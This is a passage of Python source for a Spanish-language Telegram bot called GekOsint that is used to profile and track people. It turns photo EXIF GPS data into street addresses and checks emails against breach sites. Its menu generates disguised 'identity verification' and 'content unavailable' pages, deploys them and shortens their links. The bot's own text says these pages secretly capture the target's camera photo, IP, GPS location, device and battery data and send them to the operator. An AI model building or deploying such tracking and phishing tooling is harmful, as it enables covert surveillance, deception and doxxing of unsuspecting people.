                    gps_tag = GPSTAGS.get(gps_tag_id, gps_tag_id)
                    gps_info[gps_tag] = gps_value
            elif tag in ["Make", "Model", "Software", "DateTime", "DateTimeOriginal",
                         "DateTimeDigitized", "ExifImageWidth", "ExifImageHeight",
                         "FocalLength", "ISOSpeedRatings", "ExposureTime",
                         "FNumber", "LensModel", "LensMake", "ImageDescription",
                         "Artist", "Copyright", "BodySerialNumber", "LensSerialNumber"]:
                if isinstance(value, bytes):
                    try:
                        value = value.decode('utf-8', errors='ignore')
                    except:
                        value = str(value)
                general_info.append(f"• {tag}: `{value}`")

        if general_info:
            result += "📷 **Información del dispositivo:**\n"
            result += "\n".join(general_info)
            result += "\n\n"

        if gps_info:
            lat = _convert_gps_to_decimal(gps_info.get("GPSLatitude"), gps_info.get("GPSLatitudeRef"))
            lon = _convert_gps_to_decimal(gps_info.get("GPSLongitude"), gps_info.get("GPSLongitudeRef"))

            if lat is not None and lon is not None:
                result += f"🎯 **COORDENADAS GPS ENCONTRADAS:**\n"
                result += f"📍 Latitud: `{lat}`\n"
                result += f"📍 Longitud: `{lon}`\n"
                result += f"🗺️ [Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
                result += f"🗺️ [OpenStreetMap](https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=16)\n\n"

                try:
                    geo_r = requests.get(
                        f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1",
                        headers={"User-Agent": "GekOsint-Bot/3.0"}, timeout=5
                    )
                    if geo_r.status_code == 200:
                        geo_data = geo_r.json()
                        addr = geo_data.get("address", {})
                        if addr:
                            if addr.get("road"):
                                result += f"🛣️ Calle: {addr['road']}\n"
                            if addr.get("house_number"):
                                result += f"🏠 Número: {addr['house_number']}\n"
                            if addr.get("suburb"):
                                result += f"🏘️ Colonia: {addr['suburb']}\n"
                            if addr.get("city") or addr.get("town"):
                                result += f"🏙️ Ciudad: {addr.get('city') or addr.get('town')}\n"
                            if addr.get("state"):
                                result += f"🗺️ Estado: {addr['state']}\n"
                            if addr.get("country"):
                                result += f"🌍 País: {addr['country']}\n"
                            if addr.get("postcode"):
                                result += f"📮 CP: {addr['postcode']}\n"
                            result += "\n"
                except:
                    pass

            if gps_info.get("GPSAltitude"):
                alt = gps_info["GPSAltitude"]
                if hasattr(alt, 'numerator'):
                    alt = float(alt.numerator) / float(alt.denominator)
                result += f"⛰️ Altitud: `{alt}m`\n"
        else:
            result += "📍 GPS: No disponible\n"

        result += f"\n📐 Resolución: `{img.size[0]}x{img.size[1]}`\n"
        result += f"🎨 Formato: `{img.format}`\n"
        result += f"📊 Modo: `{img.mode}`\n"

        return result

    except Exception as e:
        logger.error(f"Error EXIF: {e}")
        return f"⚠️ Error extrayendo metadatos: {str(e)}"


def _convert_gps_to_decimal(coords, ref):
    """Convierte coordenadas GPS EXIF a formato decimal"""
    if not coords or not ref:
        return None
    try:
        degrees = float(coords[0])
        minutes = float(coords[1])
        seconds = float(coords[2])
        decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
        if ref in ['S', 'W']:
            decimal = -decimal
        return round(decimal, 6)
    except (TypeError, IndexError, ZeroDivisionError):
        return None


def check_breach_advanced(query_text):
    """Verificación avanzada de brechas"""
    results = []

    # emailrep.io
    try:
        headers = {"User-Agent": "GekOsint-Bot"}
        r = requests.get(f"https://emailrep.io/{query_text}", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            reputation = data.get("reputation", "unknown")
            details = data.get("details", {})
            results.append(f"📊 EmailRep: Reputación {reputation.upper()}")
            if details.get("credentials_leaked"):
                results.append("⚠️ Credenciales filtradas detectadas")
            if details.get("data_breach"):
                results.append("🔴 Presente en brechas de datos")
            if details.get("spam"):
                results.append("📧 En listas de spam")
            if details.get("disposable"):
                results.append("🗑️ Email desechable")
            profiles = details.get("profiles", [])
            if profiles:
                results.append(f"👤 Perfiles: {', '.join(profiles)}")
    except:
        results.append("⏳ EmailRep: No disponible")

    # Verificar dominio MX
    if "@" in query_text:
        domain = query_text.split("@")[1]
        results.append(f"📧 Dominio: {domain}")
        try:
            r = requests.get(f"https://dns.google/resolve?name={domain}&type=MX", timeout=5)
            if r.status_code == 200:
                dns_data = r.json()
                answers = dns_data.get("Answer", [])
                if answers:
                    mx_servers = [a.get("data", "").split()[-1] if a.get("data") else "" for a in answers[:3]]
                    results.append(f"📬 MX: {', '.join(mx_servers)}")
        except:
            pass

    if not results:
        return "❌ No se pudieron obtener resultados."

    header = (
        f"╔══════════════════════════════╗\n"
        f"║  🔓 VERIFICACIÓN DE BRECHAS  ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"🔍 Objetivo: `{query_text}`\n\n"
    )
    header += "\n".join(results)
    header += (
        f"\n\n🔗 **Verificar manualmente:**\n"
        f"• [Have I Been Pwned](https://haveibeenpwned.com/account/{query_text})\n"
        f"• [DeHashed](https://dehashed.com/search?query={query_text})\n"
        f"• [IntelX](https://intelx.io/?s={query_text})\n"
        f"• [LeakCheck](https://leakcheck.io/check?query={query_text})\n"
        f"• [Snusbase](https://snusbase.com/)"
    )
    return header


# ═══════════════════════════════════════════════════
#  MENÚ PRINCIPAL
# ═══════════════════════════════════════════════════

def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Rastrear Número", callback_data='track_num'),
         InlineKeyboardButton("🕹️ Escanear IP", callback_data='scan_ip')],
        [InlineKeyboardButton("👤 Buscar Username", callback_data='search_user'),
         InlineKeyboardButton("📧 Analizar Email", callback_data='check_email')],
        [InlineKeyboardButton("🧿 Captura de Cámara", callback_data='cam_capture'),
         InlineKeyboardButton("🗺️ Link de Tracking", callback_data='geo_track')],
        [InlineKeyboardButton("📂 Extraer EXIF", callback_data='exif_extract'),
         InlineKeyboardButton("🔓 Verificar Brechas", callback_data='breach_check')],
    ])


def get_back_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver al Menú", callback_data='start_menu')]])


async def send_menu(update_or_query, context):
    if hasattr(update_or_query, 'effective_user'):
        user = update_or_query.effective_user.first_name
    else:
        user = update_or_query.from_user.first_name

    return (
        f"```\n"
        f"┌──(gekosint㉿terminal)-[~]\n"
        f"└─$ session.init --user {user}\n"
        f"```\n\n"
        f"🛡️ **GEKOSINT — PANEL DE CONTROL**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Sistema Online | v3.0\n"
        f"📡 Módulos OSINT: 4 | Avanzados: 4\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Selecciona un módulo:"
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = await send_menu(update, context)
    await update.message.reply_text(text, reply_markup=get_main_keyboard(), parse_mode='Markdown')


# ═══════════════════════════════════════════════════
#  MANEJADOR DE BOTONES
# ═══════════════════════════════════════════════════

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == "scan_ip":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  🕹️ SCANNER IP — ONLINE      ║\n"
            "╚══════════════════════════════╝\n\n"
            "📡 Envía la dirección IP a analizar.\n"
            "Ejemplo: `8.8.8.8`",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'ip_address'

    elif query.data == "track_num":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  📱 RASTREO GSM — ONLINE     ║\n"
            "╚══════════════════════════════╝\n\n"
            "📡 Envía el número en formato internacional.\n"
            "Ejemplo: `+525512345678`\n\n"
            "📊 Se consultarán múltiples fuentes.",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'phone_number'

    elif query.data == "search_user":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  👤 BÚSQUEDA USERNAME        ║\n"
            "╚══════════════════════════════╝\n\n"
            "🔍 Envía el username a buscar.\n"
            "Ejemplo: `johndoe123`\n\n"
            "⚡ Se buscará en 12+ plataformas.",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'username'

    elif query.data == "check_email":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  📧 ANÁLISIS DE EMAIL        ║\n"
            "╚══════════════════════════════╝\n\n"
            "📬 Envía el email a analizar.\n"
            "Ejemplo: `ejemplo@gmail.com`",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'email'

    elif query.data == "cam_capture":
        chat_id = query.message.chat_id
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  🧿 CAPTURA DE CÁMARA        ║\n"
            "╚══════════════════════════════╝\n\n"
            "⏳ Generando y subiendo página...\n"
            "Esto puede tardar unos segundos.",
            parse_mode='Markdown'
        )

        filename, html_content = create_cam_page(BOT_TOKEN, chat_id)

        # Auto-deploy a hosting gratuito
        deployed_url = deploy_html(html_content, filename)

        if deployed_url:
            # Acortar el link
            short_url = shorten_url(deployed_url)
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"🧿 **LINK DE CAPTURA LISTO**\n\n"
                    f"🔗 **Envía este link:**\n"
                    f"`{short_url}`\n\n"
                    f"📋 **Qué pasará:**\n"
                    f"• El objetivo verá 'Verificación de identidad'\n"
                    f"• Si acepta permisos de cámara → 📸 foto\n"
                    f"• Automáticamente captura: IP, ubicación, dispositivo\n\n"
                    f"📨 Los datos llegarán a este chat."
                ),
                parse_mode='Markdown',
                reply_markup=get_back_button()
            )
        else:
            # Fallback: enviar como archivo
            filepath = os.path.join(PAGES_DIR, filename)
            with open(filepath, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename="verificacion.html",
                    caption=(
                        "🧿 No se pudo subir automáticamente.\n"
                        "Sube manualmente a [Netlify Drop](https://app.netlify.com/drop)"
                    ),
                    parse_mode='Markdown'
                )
            await context.bot.send_message(
                chat_id=chat_id,
                text="⚠️ Sube el archivo manualmente.",
                reply_markup=get_back_button()
            )

    elif query.data == "geo_track":
        chat_id = query.message.chat_id
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  🗺️ LINK DE TRACKING          ║\n"
            "╚══════════════════════════════╝\n\n"
            "⏳ Generando y subiendo tracker...\n"
            "Esto puede tardar unos segundos.",
            parse_mode='Markdown'
        )

        filename, html_content = create_tracking_page(BOT_TOKEN, chat_id)

        # Auto-deploy
        deployed_url = deploy_html(html_content, filename)

        if deployed_url:
            short_url = shorten_url(deployed_url)
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"🗺️ **LINK DE TRACKING LISTO**\n\n"
                    f"🔗 **Envía este link:**\n"
                    f"`{short_url}`\n\n"
                    f"📋 **Qué captura automáticamente:**\n"
                    f"• 🌐 IP pública + geolocalización\n"
                    f"• 🎯 GPS exacto (si acepta permisos)\n"
                    f"• 📱 Dispositivo, pantalla, GPU\n"
                    f"• 🔋 Batería y conexión\n"
                    f"• 🏢 ISP, proxy/VPN detection\n\n"
                    f"📌 El objetivo verá: 'Contenido no disponible'\n"
                    f"⚡ Los datos llegan a este chat instantáneamente."
                ),
                parse_mode='Markdown',
                reply_markup=get_back_button()
            )
        else:
            filepath = os.path.join(PAGES_DIR, filename)
            with open(filepath, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename="contenido.html",
                    caption=(
                        "🗺️ No se pudo subir automáticamente.\n"
                        "Sube manualmente a [Netlify Drop](https://app.netlify.com/drop)"
                    ),
                    parse_mode='Markdown'
                )
            await context.bot.send_message(
                chat_id=chat_id,
                text="⚠️ Sube el archivo manualmente.",
                reply_markup=get_back_button()
            )

    elif query.data == "exif_extract":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  📂 EXTRACTOR DE METADATOS   ║\n"
            "╚══════════════════════════════╝\n\n"
            "📸 **Envía una foto como ARCHIVO** (📎 clip).\n\n"
            "⚠️ IMPORTANTE: Envía como **documento**,\n"
            "NO como foto (Telegram borra EXIF).\n\n"
            "📋 Se extraerá:\n"
            "• 📍 GPS + dirección exacta\n"
            "• 📷 Modelo de cámara/teléfono\n"
            "• 📅 Fecha y hora\n"
            "• 🔧 Config de cámara",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'exif_photo'

    elif query.data == "breach_check":
        await query.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  🔓 VERIFICAR BRECHAS        ║\n"
            "╚══════════════════════════════╝\n\n"
            "🔍 Envía un **email** para verificar brechas.\n"
            "Ejemplo: `usuario@gmail.com`",
            parse_mode='Markdown', reply_markup=get_back_button()
        )
        context.user_data['waiting_for'] = 'breach_query'


# ═══════════════════════════════════════════════════
#  MANEJADOR DE MENÚ (VOLVER)
# ═══════════════════════════════════════════════════

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for'] = None
    text = await send_menu(query, context)
    await query.edit_message_text(text, reply_markup=get_main_keyboard(), parse_mode='Markdown')


# ═══════════════════════════════════════════════════
#  PROCESADOR DE MENSAJES DE TEXTO
# ═══════════════════════════════════════════════════

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    action = context.user_data.get('waiting_for')
    text = update.message.text.strip()

    if not action:
        await update.message.reply_text(
            "💡 Usa /start para abrir el panel de control.",
            reply_markup=get_back_button()
        )
        return

    processing_msg = await update.message.reply_text("⏳ Procesando...")

    if action == 'ip_address':
        result = get_ip_info(text)
    elif action == 'phone_number':
        result = get_phone_info(text)
    elif action == 'username':
        result = search_username(text)
    elif action == 'email':
        result = check_email_breach(text)
    elif action == 'breach_query':
        result = check_breach_advanced(text)
    else:
        result = "❓ Acción no reconocida."

    try:
        await processing_msg.edit_text(result, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        await processing_msg.edit_text(result, disable_web_page_preview=True)

    context.user_data['waiting_for'] = None
    await update.message.reply_text("✅ Completado.", reply_markup=get_back_button())


# ═══════════════════════════════════════════════════
#  PROCESADOR DE DOCUMENTOS (FOTOS EXIF)
# ═══════════════════════════════════════════════════

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    action = context.user_data.get('waiting_for')

    if action != 'exif_photo':
        return

    document = update.message.document
    if not document:
        await update.message.reply_text("⚠️ Envía una imagen como archivo.")
        return

    mime = document.mime_type or ""
    if not mime.startswith("image/"):
        await update.message.reply_text("⚠️ No es una imagen. Envía JPG/PNG.")
        return

    processing_msg = await update.message.reply_text("⏳ Extrayendo metadatos EXIF...")

    try:
        file = await document.get_file()
        file_bytes = await file.download_as_bytearray()
        result = extract_exif_data(bytes(file_bytes))
    except Exception as e:
        logger.error(f"Error descargando: {e}")
        result = "⚠️ Error descargando el archivo."

    try:
        await processing_msg.edit_text(result, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        await processing_msg.edit_text(result, disable_web_page_preview=True)

    context.user_data['waiting_for'] = None
    await update.message.reply_text("✅ Extracción completada.", reply_markup=get_back_button())


# ═══════════════════════════════════════════════════
#  COMANDO /help
# ═══════════════════════════════════════════════════

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "🛡️ **GEKOSINT v3.0 — AYUDA**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "**Módulos OSINT:**\n"
        "📱 Rastrear Número — Operadora, área, tipo, multi-API\n"
        "🕹️ Escanear IP — Geo, ISP, VPN, reverse DNS\n"
        "👤 Buscar Username — 12+ plataformas\n"
        "📧 Analizar Email — Reputación y brechas\n\n"
        "**Módulos Avanzados:**\n"
        "🧿 Captura de Cámara — Genera página de captura\n"
        "🗺️ Link de Tracking — Genera link tracker\n"
        "📂 Extraer EXIF — GPS y metadatos de fotos\n"
        "🔓 Verificar Brechas — Multi-fuente\n\n"
        "/start — Panel | /help — Ayuda"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown', reply_markup=get_back_button())


# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════

if __name__ == '__main__':
    print("╔══════════════════════════════╗")
    print("║  🛡️ GEKOSINT v3.0 — STARTING ║")
    print("╚══════════════════════════════╝")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern='^start_menu$'))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("╔══════════════════════════════╗")
    print("║  🛡️ GEKOSINT v3.0 — ONLINE   ║")
    print("╚══════════════════════════════╝")
    app.run_polling()
